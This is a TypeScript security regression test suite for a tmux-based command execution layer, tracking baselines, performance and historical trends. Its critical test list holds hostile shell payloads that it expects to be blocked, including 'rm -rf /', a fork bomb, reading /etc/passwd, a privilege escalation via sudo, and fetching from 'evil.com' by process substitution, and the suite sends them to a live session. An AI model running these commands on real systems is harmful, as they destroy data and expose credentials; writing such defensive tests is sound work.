/**
 * Security Regression Testing Suite
 * 
 * This module implements comprehensive regression testing to prevent
 * the reintroduction of security vulnerabilities during development.
 * Designed to run continuously and catch security regressions early.
 */

import { EventEmitter } from 'events';
import { performance } from 'perf_hooks';
import { readFileSync, writeFileSync, existsSync } from 'fs';
import { join } from 'path';
import { TmuxIntegration } from '../../TmuxIntegration';
import { TmuxSessionManager } from '../../TmuxSessionManager';
import { SecurityTestResult } from './SecurityTestSuite';

export interface RegressionTestResult extends SecurityTestResult {
  regressionType: RegressionType;
  baselineResult?: SecurityTestResult;
  regression: boolean;
  confidenceLevel: number;
  historicalData: HistoricalTestData[];
}

export interface HistoricalTestData {
  timestamp: number;
  version: string;
  testResult: boolean;
  executionTime: number;
  vulnerability?: string;
  buildNumber?: number;
}

export interface SecurityBaseline {
  testId: string;
  testName: string;
  expectedResult: boolean;
  maxExecutionTime: number;
  allowedVulnerabilities: string[];
  lastUpdated: number;
  version: string;
}

export interface RegressionTestConfig {
  baselineFile: string;
  historyFile: string;
  maxHistoryEntries: number;
  regressionThreshold: number; // 0-1, confidence level for regression
  autoUpdateBaseline: boolean;
  enableTrendAnalysis: boolean;
  alertOnRegression: boolean;
}

export type RegressionType = 
  | 'security_weakness'
  | 'performance_degradation'
  | 'new_vulnerability'
  | 'blocked_fix_reverted'
  | 'configuration_change'
  | 'api_change';

/**
 * Comprehensive Security Regression Testing
 * Monitors for security regressions across releases and builds
 */
export class RegressionTests extends EventEmitter {
  private integration: TmuxIntegration;
  private sessionManager: TmuxSessionManager;
  private config: RegressionTestConfig;
  private results: RegressionTestResult[] = [];
  private baselines: Map<string, SecurityBaseline> = new Map();
  private historicalData: Map<string, HistoricalTestData[]> = new Map();

  // Known vulnerability patterns that should NEVER pass
  private readonly CRITICAL_REGRESSION_TESTS = [
    {
      id: 'REG_CMD_INJECTION_001',
      name: 'Command Injection Prevention',
      description: 'Ensure command injection is blocked',
      payload: 'echo test; rm -rf /',
      expectedBlocked: true,
      riskLevel: 10.0,
      category: 'command_injection'
    },
    {
      id: 'REG_PRIV_ESC_001',
      name: 'Privilege Escalation Prevention',
      description: 'Ensure privilege escalation is blocked',
      payload: 'sudo su -',
      expectedBlocked: true,
      riskLevel: 10.0,
      category: 'privilege_escalation'
    },
    {
      id: 'REG_PATH_TRAV_001',
      name: 'Path Traversal Prevention',
      description: 'Ensure path traversal is blocked',
      payload: 'cat ../../../etc/passwd',
      expectedBlocked: true,
      riskLevel: 9.0,
      category: 'path_traversal'
    },
    {
      id: 'REG_SCRIPT_INJ_001',
      name: 'Script Injection Prevention',
      description: 'Ensure script injection is blocked',
      payload: 'python3 -c "import os; os.system(\'rm -rf /\')"',
      expectedBlocked: true,
      riskLevel: 9.5,
      category: 'script_injection'
    },
    {
      id: 'REG_ENV_INJ_001',
      name: 'Environment Injection Prevention',
      description: 'Ensure environment injection is blocked',
      payload: 'export PATH="/tmp:$PATH"; evil_command',
      expectedBlocked: true,
      riskLevel: 9.0,
      category: 'environment_injection'
    },
    {
      id: 'REG_PROC_SUB_001',
      name: 'Process Substitution Prevention',
      description: 'Ensure process substitution is blocked',
      payload: 'cat <(curl evil.com/payload)',
      expectedBlocked: true,
      riskLevel: 9.0,
      category: 'process_substitution'
    },
    {
      id: 'REG_HEREDOC_001',
      name: 'Heredoc Injection Prevention',
      description: 'Ensure heredoc injection is blocked',
      payload: 'cat <<EOF\\n$(malicious_command)\\nEOF',
      expectedBlocked: true,
      riskLevel: 8.5,
      category: 'heredoc_injection'
    },
    {
      id: 'REG_FORK_BOMB_001',
      name: 'Fork Bomb Prevention',
      description: 'Ensure fork bombs are blocked',
      payload: ':(){ :|:& };:',
      expectedBlocked: true,
      riskLevel: 9.5,
      category: 'resource_exhaustion'
    },
    {
      id: 'REG_BUFFER_001',
      name: 'Buffer Overflow Prevention',
      description: 'Ensure large buffers are handled safely',
      payload: 'A'.repeat(100000),
      expectedBlocked: false, // Should be handled, not blocked
      riskLevel: 8.5,
      category: 'buffer_overflow'
    },
    {
      id: 'REG_SESSION_001',
      name: 'Session Isolation',
      description: 'Ensure sessions are properly isolated',
      payload: 'ACCESS_OTHER_SESSION',
      expectedBlocked: true,
      riskLevel: 9.0,
      category: 'session_security'
    }
  ];

  // Performance regression baselines
  private readonly PERFORMANCE_BASELINES = [
    {
      id: 'PERF_SESSION_CREATE',
      name: 'Session Creation Performance',
      operation: 'session_creation',
      maxExecutionTime: 1000, // 1 second
      regressionThreshold: 1.5 // 50% slower triggers regression
    },
    {
      id: 'PERF_COMMAND_EXEC',
      name: 'Command Execution Performance',
      operation: 'command_execution',
      maxExecutionTime: 500, // 500ms
      regressionThreshold: 2.0 // 100% slower triggers regression
    },
    {
      id: 'PERF_OUTPUT_CAPTURE',
      name: 'Output Capture Performance',
      operation: 'output_capture',
      maxExecutionTime: 200, // 200ms
      regressionThreshold: 1.8 // 80% slower triggers regression
    }
  ];

  constructor(config: Partial<RegressionTestConfig> = {}) {
    super();
    
    this.config = {
      baselineFile: config.baselineFile || './security-baseline.json',
      historyFile: config.historyFile || './security-history.json',
      maxHistoryEntries: config.maxHistoryEntries || 1000,
      regressionThreshold: config.regressionThreshold || 0.8,
      autoUpdateBaseline: config.autoUpdateBaseline ?? false,
      enableTrendAnalysis: config.enableTrendAnalysis ?? true,
      alertOnRegression: config.alertOnRegression ?? true
    };

    this.integration = new TmuxIntegration({
      performanceMode: 'reliability',
      commandTimeout: 10000
    });

    this.sessionManager = new TmuxSessionManager({
      socketPath: '/tmp/tmux-regression-socket',
      commandTimeout: 10000,
      performanceMode: 'reliability'
    });

    this.loadBaselines();
    this.loadHistoricalData();
  }

  /**
   * Execute comprehensive regression testing
   */
  async runRegressionTests(): Promise<RegressionTestResult[]> {
    console.log('🔄 Starting Security Regression Testing...');
    console.log(`📊 Critical Tests: ${this.CRITICAL_REGRESSION_TESTS.length}`);
    console.log(`📈 Performance Tests: ${this.PERFORMANCE_BASELINES.length}`);
    console.log(`📚 Historical Entries: ${this.getTotalHistoricalEntries()}`);
    
    const startTime = performance.now();
    this.results = [];
    
    this.emit('regression-testing-started', {
      timestamp: Date.now(),
      config: this.config,
      testsToRun: this.CRITICAL_REGRESSION_TESTS.length + this.PERFORMANCE_BASELINES.length
    });

    try {
      await this.integration.initialize();
      await this.sessionManager.initialize();

      // Run critical security regression tests
      await this.runCriticalSecurityTests();
      
      // Run performance regression tests
      await this.runPerformanceRegressionTests();
      
      // Run configuration regression tests
      await this.runConfigurationRegressionTests();
      
      // Run API regression tests
      await this.runAPIRegressionTests();
      
      // Analyze trends if enabled
      if (this.config.enableTrendAnalysis) {
        await this.runTrendAnalysis();
      }
      
      // Update historical data
      this.updateHistoricalData();
      
      // Check for regressions and alert if necessary
      await this.analyzeRegressions();

    } catch (error) {
      console.error('Regression testing failed:', error);
      
      this.results.push({
        testId: 'REG_SETUP_FAILURE',
        testName: 'Regression Test Setup',
        category: 'command_injection',
        riskScore: 10.0,
        passed: false,
        vulnerability: 'Regression test setup failure',
        severity: 'critical',
        details: `Setup failed: ${error}`,
        executionTime: performance.now() - startTime,
        regressionType: 'configuration_change',
        regression: true,
        confidenceLevel: 1.0,
        historicalData: []
      });
    } finally {
      await this.cleanup();
    }

    const totalTime = performance.now() - startTime;
    console.log(`✅ Regression testing completed in ${totalTime.toFixed(2)}ms`);
    
    const regressions = this.results.filter(r => r.regression);
    if (regressions.length > 0) {
      console.log(`⚠️ ${regressions.length} regression(s) detected!`);
    }
    
    this.emit('regression-testing-completed', {
      results: this.results,
      totalTime,
      regressionsFound: regressions.length
    });

    return this.results;
  }

  /**
   * Run critical security regression tests
   */
  private async runCriticalSecurityTests(): Promise<void> {
    console.log('🔒 Running critical security regression tests...');
    
    for (const test of this.CRITICAL_REGRESSION_TESTS) {
      const startTime = performance.now();
      
      try {
        this.emit('regression-test-started', { test });
        
        let testPassed = false;
        let vulnerability: string | undefined;
        let actualOutcome = '';
        
        try {
          // Execute the test payload
          await this.integration.executeCommand(test.payload);
          const executionTime = performance.now() - startTime;
          
          // Check the output
          const output = await this.integration.getOutput(100);
          
          // Analyze if the test was properly blocked/handled
          const wasBlocked = this.analyzeSecurityTest(test, output, executionTime);
          
          if (test.expectedBlocked) {
            testPassed = wasBlocked;
            if (!wasBlocked) {
              vulnerability = `Security control bypassed: ${test.description}`;
            }
          } else {
            testPassed = !this.hasSecurityIssue(output);
            if (!testPassed) {
              vulnerability = `Security issue detected in handling: ${test.description}`;
            }
          }
          
          actualOutcome = `Blocked: ${wasBlocked}, Output length: ${output.length}`;
          
        } catch (error) {
          // Error usually means the test was blocked (good for security tests)
          testPassed = test.expectedBlocked;
          actualOutcome = `Error: ${error}`;
        }
        
        const executionTime = performance.now() - startTime;
        
        // Get baseline for comparison
        const baseline = this.baselines.get(test.id);
        const historical = this.historicalData.get(test.id) || [];
        
        // Detect regression
        const regression = this.detectSecurityRegression(test, testPassed, baseline, historical);
        
        const result: RegressionTestResult = {
          testId: test.id,
          testName: test.name,
          category: test.category as any,
          riskScore: test.riskLevel,
          passed: testPassed,
          vulnerability,
          severity: testPassed ? 'info' : 'critical',
          details: `${test.description}. ${actualOutcome}. Time: ${executionTime.toFixed(2)}ms`,
          executionTime,
          attackVector: test.payload,
          regressionType: 'security_weakness',
          baselineResult: baseline ? this.convertBaselineToResult(baseline) : undefined,
          regression: regression.isRegression,
          confidenceLevel: regression.confidence,
          historicalData: historical
        };
        
        this.results.push(result);
        this.emit('regression-test-completed', { test, result });
        
        // Update baseline if auto-update is enabled and test passed
        if (this.config.autoUpdateBaseline && testPassed) {
          this.updateBaseline(test.id, test.name, testPassed, executionTime);
        }
        
      } catch (error) {
        const executionTime = performance.now() - startTime;
        
        this.results.push({
          testId: test.id,
          testName: test.name,
          category: test.category as any,
          riskScore: test.riskLevel,
          passed: false,
          vulnerability: `Test execution failed: ${error}`,
          severity: 'critical',
          details: `Critical security test failed: ${error}`,
          executionTime,
          regressionType: 'security_weakness',
          regression: true,
          confidenceLevel: 1.0,
          historicalData: []
        });
      }
    }
  }

  /**
   * Run performance regression tests
   */
  private async runPerformanceRegressionTests(): Promise<void> {
    console.log('⚡ Running performance regression tests...');
    
    for (const perfTest of this.PERFORMANCE_BASELINES) {
      const startTime = performance.now();
      
      try {
        let executionTime = 0;
        
        switch (perfTest.operation) {
          case 'session_creation':
            executionTime = await this.measureSessionCreation();
            break;
          case 'command_execution':
            executionTime = await this.measureCommandExecution();
            break;
          case 'output_capture':
            executionTime = await this.measureOutputCapture();
            break;
        }
        
        const baseline = this.baselines.get(perfTest.id);
        const historical = this.historicalData.get(perfTest.id) || [];
        
        // Check for performance regression
        const performanceRegression = this.detectPerformanceRegression(
          perfTest, 
          executionTime, 
          baseline, 
          historical
        );
        
        const testPassed = executionTime <= perfTest.maxExecutionTime && 
                          !performanceRegression.isRegression;
        
        const result: RegressionTestResult = {
          testId: perfTest.id,
          testName: perfTest.name,
          category: 'performance',
          riskScore: 5.0, // Performance issues are medium risk
          passed: testPassed,
          vulnerability: performanceRegression.isRegression ? 
            `Performance regression detected: ${performanceRegression.details}` : undefined,
          severity: performanceRegression.isRegression ? 'medium' : 'info',
          details: `${perfTest.operation} took ${executionTime.toFixed(2)}ms (baseline: ${perfTest.maxExecutionTime}ms)`,
          executionTime: performance.now() - startTime,
          regressionType: 'performance_degradation',
          regression: performanceRegression.isRegression,
          confidenceLevel: performanceRegression.confidence,
          historicalData: historical
        };
        
        this.results.push(result);
        
      } catch (error) {
        this.results.push({
          testId: perfTest.id,
          testName: perfTest.name,
          category: 'performance',
          riskScore: 7.0,
          passed: false,
          vulnerability: `Performance test failed: ${error}`,
          severity: 'high',
          details: `Performance regression test failed: ${error}`,
          executionTime: performance.now() - startTime,
          regressionType: 'performance_degradation',
          regression: true,
          confidenceLevel: 1.0,
          historicalData: []
        });
      }
    }
  }

  /**
   * Run configuration regression tests
   */
  private async runConfigurationRegressionTests(): Promise<void> {
    console.log('⚙️ Running configuration regression tests...');
    
    const configTests = [
      {
        id: 'REG_CONFIG_SOCKET',
        name: 'Socket Path Configuration',
        check: () => this.integration.getConfig?.()?.socketPath !== undefined
      },
      {
        id: 'REG_CONFIG_TIMEOUT',
        name: 'Command Timeout Configuration',
        check: () => this.integration.getConfig?.()?.commandTimeout !== undefined
      },
      {
        id: 'REG_CONFIG_SHELL',
        name: 'Default Shell Configuration',
        check: () => this.integration.getConfig?.()?.defaultShell !== undefined
      }
    ];
    
    for (const configTest of configTests) {
      const startTime = performance.now();
      
      try {
        const configValid = configTest.check();
        const baseline = this.baselines.get(configTest.id);
        
        const regression = configValid !== (baseline?.expectedResult ?? true);
        
        this.results.push({
          testId: configTest.id,
          testName: configTest.name,
          category: 'configuration',
          riskScore: 6.0,
          passed: configValid,
          vulnerability: regression ? 'Configuration regression detected' : undefined,
          severity: regression ? 'medium' : 'info',
          details: `Configuration check: ${configValid}`,
          executionTime: performance.now() - startTime,
          regressionType: 'configuration_change',
          regression,
          confidenceLevel: 1.0,
          historicalData: this.historicalData.get(configTest.id) || []
        });
        
      } catch (error) {
        this.results.push({
          testId: configTest.id,
          testName: configTest.name,
          category: 'configuration',
          riskScore: 8.0,
          passed: false,
          vulnerability: `Configuration test failed: ${error}`,
          severity: 'high',
          details: `Configuration regression test failed: ${error}`,
          executionTime: performance.now() - startTime,
          regressionType: 'configuration_change',
          regression: true,
          confidenceLevel: 1.0,
          historicalData: []
        });
      }
    }
  }

  /**
   * Run API regression tests
   */
  private async runAPIRegressionTests(): Promise<void> {
    console.log('🔌 Running API regression tests...');
    
    const apiTests = [
      {
        id: 'REG_API_SESSION_CREATE',
        name: 'Session Creation API',
        test: async () => {
          const session = await this.integration.createSession('api-test');
          await this.integration.destroySession(session.id);
          return true;
        }
      },
      {
        id: 'REG_API_COMMAND_EXEC',
        name: 'Command Execution API',
        test: async () => {
          await this.integration.executeCommand('echo "api test"');
          return true;
        }
      },
      {
        id: 'REG_API_OUTPUT_CAPTURE',
        name: 'Output Capture API',
        test: async () => {
          const output = await this.integration.getOutput(10);
          return typeof output === 'string';
        }
      }
    ];
    
    for (const apiTest of apiTests) {
      const startTime = performance.now();
      
      try {
        const apiWorking = await apiTest.test();
        const baseline = this.baselines.get(apiTest.id);
        
        const regression = !apiWorking || (baseline && !baseline.expectedResult);
        
        this.results.push({
          testId: apiTest.id,
          testName: apiTest.name,
          category: 'api',
          riskScore: 7.0,
          passed: apiWorking,
          vulnerability: regression ? 'API regression detected' : undefined,
          severity: regression ? 'high' : 'info',
          details: `API functionality: ${apiWorking}`,
          executionTime: performance.now() - startTime,
          regressionType: 'api_change',
          regression,
          confidenceLevel: 1.0,
          historicalData: this.historicalData.get(apiTest.id) || []
        });
        
      } catch (error) {
        this.results.push({
          testId: apiTest.id,
          testName: apiTest.name,
          category: 'api',
          riskScore: 9.0,
          passed: false,
          vulnerability: `API test failed: ${error}`,
          severity: 'critical',
          details: `API regression test failed: ${error}`,
          executionTime: performance.now() - startTime,
          regressionType: 'api_change',
          regression: true,
          confidenceLevel: 1.0,
          historicalData: []
        });
      }
    }
  }

  /**
   * Run trend analysis on historical data
   */
  private async runTrendAnalysis(): Promise<void> {
    console.log('📈 Running trend analysis...');
    
    for (const [testId, historical] of this.historicalData) {
      if (historical.length < 5) continue; // Need minimum data points
      
      const recentEntries = historical.slice(-10); // Last 10 entries
      const trend = this.analyzeTrend(recentEntries);
      
      if (trend.isNegative) {
        this.results.push({
          testId: `TREND_${testId}`,
          testName: `Trend Analysis: ${testId}`,
          category: 'trend_analysis',
          riskScore: 6.0,
          passed: false,
          vulnerability: `Negative trend detected: ${trend.description}`,
          severity: 'medium',
          details: `Trend analysis over ${recentEntries.length} data points: ${trend.details}`,
          executionTime: 0,
          regressionType: 'security_weakness',
          regression: true,
          confidenceLevel: trend.confidence,
          historicalData: recentEntries
        });
      }
    }
  }

  // Analysis methods
  private analyzeSecurityTest(test: any, output: string, executionTime: number): boolean {
    // Check if the command was blocked based on various indicators
    const blockIndicators = [
      'permission denied',
      'command not found',
      'access denied',
      'forbidden',
      'unauthorized',
      'blocked',
      'filtered',
      'sanitized'
    ];
    
    const lowerOutput = output.toLowerCase();
    const wasBlocked = blockIndicators.some(indicator => 
      lowerOutput.includes(indicator)
    ) || output.trim().length === 0 || executionTime < 10;
    
    return wasBlocked;
  }

  private hasSecurityIssue(output: string): boolean {
    const securityIssueIndicators = [
      'root:', // Password file
      '-----BEGIN', // Private keys
      'uid=0(root)', // Root privilege
      'Segmentation fault', // Buffer overflow
      'core dumped', // Crash
      'stack overflow' // Memory issue
    ];
    
    return securityIssueIndicators.some(indicator => 
      output.includes(indicator)
    );
  }

  private detectSecurityRegression(test: any, currentResult: boolean, baseline?: SecurityBaseline, historical: HistoricalTestData[] = []): {isRegression: boolean, confidence: number, details: string} {
    // If no baseline, not a regression
    if (!baseline) {
      return {isRegression: false, confidence: 0, details: 'No baseline available'};
    }
    
    // If current result differs from expected baseline
    if (currentResult !== baseline.expectedResult) {
      const recentFailures = historical.slice(-5).filter(h => h.testResult !== baseline.expectedResult).length;
      const confidence = Math.min(1.0, (recentFailures + 1) / 3); // Confidence builds with repeated failures
      
      return {
        isRegression: true,
        confidence,
        details: `Expected: ${baseline.expectedResult}, Got: ${currentResult}. Recent failures: ${recentFailures}/5`
      };
    }
    
    return {isRegression: false, confidence: 0, details: 'Result matches baseline'};
  }

  private detectPerformanceRegression(perfTest: any, currentTime: number, baseline?: SecurityBaseline, historical: HistoricalTestData[] = []): {isRegression: boolean, confidence: number, details: string} {
    const maxTime = perfTest.maxExecutionTime;
    const threshold = perfTest.regressionThreshold;
    
    // Check against absolute maximum
    if (currentTime > maxTime) {
      return {
        isRegression: true,
        confidence: 1.0,
        details: `Execution time ${currentTime.toFixed(2)}ms exceeds maximum ${maxTime}ms`
      };
    }
    
    // Check against historical average
    if (historical.length >= 3) {
      const recentTimes = historical.slice(-5).map(h => h.executionTime);
      const avgTime = recentTimes.reduce((sum, t) => sum + t, 0) / recentTimes.length;
      
      if (currentTime > avgTime * threshold) {
        const confidence = Math.min(1.0, (currentTime / avgTime - 1) / (threshold - 1));
        return {
          isRegression: true,
          confidence,
          details: `Current time ${currentTime.toFixed(2)}ms is ${(currentTime/avgTime*100).toFixed(1)}% of recent average ${avgTime.toFixed(2)}ms`
        };
      }
    }
    
    return {isRegression: false, confidence: 0, details: 'Performance within acceptable range'};
  }

  private analyzeTrend(entries: HistoricalTestData[]): {isNegative: boolean, confidence: number, description: string, details: string} {
    if (entries.length < 3) {
      return {isNegative: false, confidence: 0, description: 'Insufficient data', details: 'Need at least 3 data points'};
    }
    
    // Analyze test result trend
    const failureRate = entries.filter(e => !e.testResult).length / entries.length;
    
    // Analyze performance trend
    const times = entries.map(e => e.executionTime);
    const avgTime = times.reduce((sum, t) => sum + t, 0) / times.length;
    const recentAvg = times.slice(-3).reduce((sum, t) => sum + t, 0) / 3;
    const performanceDegradation = (recentAvg - avgTime) / avgTime;
    
    let isNegative = false;
    let confidence = 0;
    let description = '';
    let details = '';
    
    if (failureRate > 0.3) { // More than 30% failures
      isNegative = true;
      confidence = Math.min(1.0, failureRate);
      description = 'High failure rate detected';
      details = `${(failureRate * 100).toFixed(1)}% failure rate over ${entries.length} entries`;
    } else if (performanceDegradation > 0.5) { // 50% performance degradation
      isNegative = true;
      confidence = Math.min(1.0, performanceDegradation);
      description = 'Performance degradation trend';
      details = `${(performanceDegradation * 100).toFixed(1)}% performance degradation trend`;
    }
    
    return {isNegative, confidence, description, details};
  }

  // Performance measurement methods
  private async measureSessionCreation(): Promise<number> {
    const startTime = performance.now();
    const session = await this.integration.createSession('perf-test-session');
    await this.integration.destroySession(session.id);
    return performance.now() - startTime;
  }

  private async measureCommandExecution(): Promise<number> {
    const startTime = performance.now();
    await this.integration.executeCommand('echo "performance test"');
    return performance.now() - startTime;
  }

  private async measureOutputCapture(): Promise<number> {
    const startTime = performance.now();
    await this.integration.getOutput(50);
    return performance.now() - startTime;
  }

  // Data management methods
  private loadBaselines(): void {
    try {
      if (existsSync(this.config.baselineFile)) {
        const data = JSON.parse(readFileSync(this.config.baselineFile, 'utf8'));
        for (const baseline of data.baselines || []) {
          this.baselines.set(baseline.testId, baseline);
        }
        console.log(`📚 Loaded ${this.baselines.size} baseline(s)`);
      }
    } catch (error) {
      console.warn(`Failed to load baselines: ${error}`);
    }
  }

  private loadHistoricalData(): void {
    try {
      if (existsSync(this.config.historyFile)) {
        const data = JSON.parse(readFileSync(this.config.historyFile, 'utf8'));
        for (const [testId, history] of Object.entries(data.history || {})) {
          this.historicalData.set(testId, history as HistoricalTestData[]);
        }
        console.log(`📊 Loaded historical data for ${this.historicalData.size} test(s)`);
      }
    } catch (error) {
      console.warn(`Failed to load historical data: ${error}`);
    }
  }

  private updateBaseline(testId: string, testName: string, result: boolean, executionTime: number): void {
    const baseline: SecurityBaseline = {
      testId,
      testName,
      expectedResult: result,
      maxExecutionTime: executionTime * 1.2, // 20% buffer
      allowedVulnerabilities: [],
      lastUpdated: Date.now(),
      version: process.env.npm_package_version || '1.0.0'
    };
    
    this.baselines.set(testId, baseline);
  }

  private updateHistoricalData(): void {
    for (const result of this.results) {
      const history = this.historicalData.get(result.testId) || [];
      
      const entry: HistoricalTestData = {
        timestamp: Date.now(),
        version: process.env.npm_package_version || '1.0.0',
        testResult: result.passed,
        executionTime: result.executionTime,
        vulnerability: result.vulnerability,
        buildNumber: parseInt(process.env.BUILD_NUMBER || '0')
      };
      
      history.push(entry);
      
      // Limit history size
      if (history.length > this.config.maxHistoryEntries) {
        history.splice(0, history.length - this.config.maxHistoryEntries);
      }
      
      this.historicalData.set(result.testId, history);
    }
    
    this.saveData();
  }

  private saveData(): void {
    try {
      // Save baselines
      const baselineData = {
        version: '1.0.0',
        timestamp: Date.now(),
        baselines: Array.from(this.baselines.values())
      };
      writeFileSync(this.config.baselineFile, JSON.stringify(baselineData, null, 2));
      
      // Save historical data
      const historyData = {
        version: '1.0.0',
        timestamp: Date.now(),
        history: Object.fromEntries(this.historicalData)
      };
      writeFileSync(this.config.historyFile, JSON.stringify(historyData, null, 2));
      
    } catch (error) {
      console.error(`Failed to save regression test data: ${error}`);
    }
  }

  private async analyzeRegressions(): Promise<void> {
    const regressions = this.results.filter(r => r.regression);
    
    if (regressions.length > 0 && this.config.alertOnRegression) {
      console.log(`🚨 SECURITY REGRESSION ALERT: ${regressions.length} regression(s) detected!`);
      
      for (const regression of regressions) {
        console.log(`   - ${regression.testName}: ${regression.vulnerability}`);
        console.log(`     Confidence: ${(regression.confidenceLevel * 100).toFixed(1)}%`);
        console.log(`     Type: ${regression.regressionType}`);
      }
      
      this.emit('security-regression-detected', {
        regressions,
        severity: regressions.some(r => r.severity === 'critical') ? 'critical' : 'high'
      });
    }
  }

  private convertBaselineToResult(baseline: SecurityBaseline): SecurityTestResult {
    return {
      testId: baseline.testId,
      testName: baseline.testName,
      category: 'baseline',
      riskScore: 5.0,
      passed: baseline.expectedResult,
      severity: 'info',
      details: `Baseline from ${new Date(baseline.lastUpdated).toISOString()}`,
      executionTime: baseline.maxExecutionTime
    };
  }

  private getTotalHistoricalEntries(): number {
    return Array.from(this.historicalData.values())
      .reduce((total, history) => total + history.length, 0);
  }

  async cleanup(): Promise<void> {
    try {
      await this.integration.cleanup();
      await this.sessionManager.cleanup();
    } catch (error) {
      console.error('Regression test cleanup error:', error);
    }
  }

  getResults(): RegressionTestResult[] {
    return [...this.results];
  }

  getBaselines(): SecurityBaseline[] {
    return Array.from(this.baselines.values());
  }

  getHistoricalData(): Map<string, HistoricalTestData[]> {
    return new Map(this.historicalData);
  }

  /**
   * Generate comprehensive regression test report
   */
  generateRegressionReport(): string {
    const regressions = this.results.filter(r => r.regression);
    const criticalRegressions = regressions.filter(r => r.severity === 'critical');
    
    let report = '# Security Regression Test Report\n\n';
    
    report += '## Executive Summary\n\n';
    if (regressions.length === 0) {
      report += '✅ **REGRESSION TEST: PASS** - No security regressions detected\n\n';
    } else if (criticalRegressions.length === 0) {
      report += '⚠️ **REGRESSION TEST: WARNING** - Minor regressions detected\n\n';
    } else {
      report += '❌ **REGRESSION TEST: FAIL** - Critical security regressions detected\n\n';
    }
    
    report += `- **Total Tests**: ${this.results.length}\n`;
    report += `- **Regressions Detected**: ${regressions.length}\n`;
    report += `- **Critical Regressions**: ${criticalRegressions.length}\n`;
    report += `- **Average Confidence**: ${(regressions.reduce((sum, r) => sum + r.confidenceLevel, 0) / Math.max(regressions.length, 1) * 100).toFixed(1)}%\n`;
    report += `- **Baseline Coverage**: ${this.baselines.size} test(s)\n`;
    report += `- **Historical Data Points**: ${this.getTotalHistoricalEntries()}\n\n`;
    
    if (criticalRegressions.length > 0) {
      report += '## 🚨 Critical Regressions\n\n';
      for (const regression of criticalRegressions) {
        report += `### ${regression.testName}\n`;
        report += `- **Type**: ${regression.regressionType}\n`;
        report += `- **Confidence**: ${(regression.confidenceLevel * 100).toFixed(1)}%\n`;
        report += `- **Vulnerability**: ${regression.vulnerability}\n`;
        report += `- **Details**: ${regression.details}\n`;
        if (regression.baselineResult) {
          report += `- **Baseline**: ${regression.baselineResult.details}\n`;
        }
        report += '\n';
      }
    }
    
    report += '## Regression Analysis by Type\n\n';
    const regressionsByType = regressions.reduce((acc, r) => {
      acc[r.regressionType] = (acc[r.regressionType] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);
    
    for (const [type, count] of Object.entries(regressionsByType)) {
      report += `- **${type}**: ${count} regression(s)\n`;
    }
    report += '\n';
    
    report += '## Historical Trends\n\n';
    if (this.config.enableTrendAnalysis) {
      const trendResults = this.results.filter(r => r.testId.startsWith('TREND_'));
      if (trendResults.length > 0) {
        for (const trend of trendResults) {
          report += `- ${trend.testName}: ${trend.vulnerability}\n`;
        }
      } else {
        report += '- No concerning trends detected\n';
      }
    } else {
      report += '- Trend analysis disabled\n';
    }
    report += '\n';
    
    report += '## Recommendations\n\n';
    if (criticalRegressions.length > 0) {
      report += '### Immediate Actions\n';
      report += '1. **STOP DEPLOYMENT** - Critical security regressions detected\n';
      report += '2. Investigate and fix all critical regressions\n';
      report += '3. Re-run full security test suite\n';
      report += '4. Update security baselines after fixes\n\n';
    }
    
    report += '### Continuous Improvement\n';
    report += '1. Integrate regression tests into CI/CD pipeline\n';
    report += '2. Set up automated alerts for regressions\n';
    report += '3. Regular baseline updates with security team approval\n';
    report += '4. Expand historical data collection\n';
    report += '5. Implement automated rollback on critical regressions\n\n';
    
    return report;
  }
}